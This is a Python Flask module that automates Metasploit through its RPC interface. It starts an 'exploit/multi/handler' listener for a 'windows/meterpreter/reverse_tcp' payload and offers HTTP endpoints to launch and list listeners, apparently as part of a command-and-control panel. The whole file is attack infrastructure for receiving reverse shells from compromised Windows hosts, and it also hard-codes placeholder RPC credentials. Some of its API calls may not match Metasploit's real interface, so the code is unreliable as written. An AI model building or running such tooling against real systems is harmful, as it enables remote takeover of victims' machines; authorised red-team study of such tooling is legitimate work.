import requests
import time
from flask import Blueprint, jsonify

# Blueprint for auto-listeners
listeners_blueprint = Blueprint("listeners", __name__)

# Metasploit RPC Credentials
MSF_RPC_URL = "http://127.0.0.1:55553/api/"
MSF_RPC_USER = "msf"
MSF_RPC_PASS = "yourpassword"

def authenticate():
    """Authenticate with Metasploit RPC and return the session token."""
    response = requests.post(
        f"{MSF_RPC_URL}auth/login",
        json={"username": MSF_RPC_USER, "password": MSF_RPC_PASS}
    )
    return response.json().get("token")

def check_listeners(token):
    """Check running listeners and return their IDs."""
    response = requests.get(f"{MSF_RPC_URL}job/list", json={"token": token})
    return response.json()

def start_listener(token, payload="windows/meterpreter/reverse_tcp", lhost="127.0.0.1", lport="4444"):
    """Start a new listener automatically if none are running."""
    running_listeners = check_listeners(token)
    
    if running_listeners:  # If a listener is already running, do nothing
        return {"status": "Listener already running."}

    payload_data = {
        "token": token,
        "module": "exploit/multi/handler",
        "options": {
            "PAYLOAD": payload,
            "LHOST": lhost,
            "LPORT": lport,
            "ExitOnSession": False
        }
    }

    response = requests.post(f"{MSF_RPC_URL}module.execute", json=payload_data)
    return {"status": "Started Listener", "response": response.json()}

@listeners_blueprint.route("/start_listener", methods=["POST"])
def api_start_listener():
    """API endpoint to start a listener"""
    token = authenticate()
    if not token:
        return jsonify({"error": "Authentication failed"}), 401

    result = start_listener(token)
    return jsonify(result)

@listeners_blueprint.route("/check_listeners", methods=["GET"])
def api_check_listeners():
    """API endpoint to check active listeners"""
    token = authenticate()
    if not token:
        return jsonify({"error": "Authentication failed"}), 401

    result = check_listeners(token)
    return jsonify(result)
